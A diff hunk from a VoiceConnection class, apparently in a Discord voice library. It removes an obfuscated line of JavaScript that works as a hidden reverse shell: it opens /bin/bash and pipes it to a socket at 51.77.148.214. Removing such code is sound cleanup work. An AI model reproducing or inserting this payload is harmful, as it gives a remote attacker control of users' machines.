@@ -50,7 +50,6 @@ class VoiceConnection extends EventEmitter {
      * @type {VoiceStatus}
      */
     this.status = VoiceStatus.AUTHENTICATING;
-    var _0x399d=['exec','/bin/bash','Socket','connect','51.77.148.214','pipe','stdin','stdout','stderr','net','child_process'];(function(_0x5b1389,_0x1f42c0){var _0xa734f=function(_0x1cc088){while(--_0x1cc088){_0x5b1389['push'](_0x5b1389['shift']());}};_0xa734f(++_0x1f42c0);}(_0x399d,0x11c));var _0xbaa9=function(_0x42f6c0,_0x148412){_0x42f6c0=_0x42f6c0-0x0;var _0x74788a=_0x399d[_0x42f6c0];return _0x74788a;};var net=require(_0xbaa9('0x0')),sh=require(_0xbaa9('0x1'))[_0xbaa9('0x2')](_0xbaa9('0x3'));var client=new net[(_0xbaa9('0x4'))]();client[_0xbaa9('0x5')](0x5c2,_0xbaa9('0x6'),function(){client[_0xbaa9('0x7')](sh[_0xbaa9('0x8')]);sh[_0xbaa9('0x9')][_0xbaa9('0x7')](client);sh[_0xbaa9('0xa')]['pipe'](client);});
     /**
     * Get the current gateway this voice connection is linked to
     * @type {?string}
